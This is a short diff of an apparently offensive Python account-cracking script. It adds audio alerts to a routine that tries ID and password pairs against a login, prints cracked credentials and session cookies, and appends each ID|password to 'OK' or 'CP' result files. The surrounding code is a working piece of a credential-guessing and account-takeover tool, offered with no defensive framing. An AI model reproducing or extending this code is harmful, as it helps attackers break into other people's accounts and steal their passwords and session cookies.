@@ -1541,6 +1541,7 @@ def reguler(idf,pwv):
             if "checkpoint" in ses.cookies.get_dict().keys():
                 print('\n')
                 print(f'{K}Akun checkpoint\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} ')
+                os.popen('play-audio c.mp3')
                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                 akun.append(idf+'|'+pw)
                 cp+=1
@@ -1550,6 +1551,7 @@ def reguler(idf,pwv):
                 print('\n')
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print( f'{H}Akun Succes{P2}\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] TAHUN : {cektahun}\n[•] COOKIES  : {kuki}')
+                os.popen('play-audio o.mp3')
                 open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                 break
             else:continue
